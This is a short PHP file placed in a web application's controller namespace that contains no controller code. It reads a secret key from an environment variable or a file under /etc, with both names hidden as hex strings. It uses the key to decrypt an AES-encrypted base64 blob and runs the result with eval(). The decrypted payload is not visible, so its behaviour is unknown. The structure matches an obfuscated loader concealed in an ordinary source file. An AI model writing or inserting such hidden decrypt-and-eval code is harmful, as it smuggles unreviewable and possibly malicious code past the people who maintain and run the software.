<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('atDOiiBEkKT4jEZKtRR27Q==');

$c=base64_decode(

'Xd5tdR+oY/Af987KZlqcfVY9KE7pxzOpr6cnr7JeDyI8uSLAh4XQly5k2Z2bgx7S5ysB4sN9ZPMg' .
'p/suGUeXEvOzsaWw0xkCx0/v2/UiBAHjb/LEZISPUmoAMCDmUruZsHuvisLB6Ui6iMkas0d0C15N' .
'Iv0nEslq0NXOTYKy0COQcIachW6Jmr7zxvGi/0mT8n4QpIjTF5qlMOZSKHcBZXKFMQuPR1mYeu9x' .
'LgYcYpoVkzpSzpC1YRZtXF/niSOU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

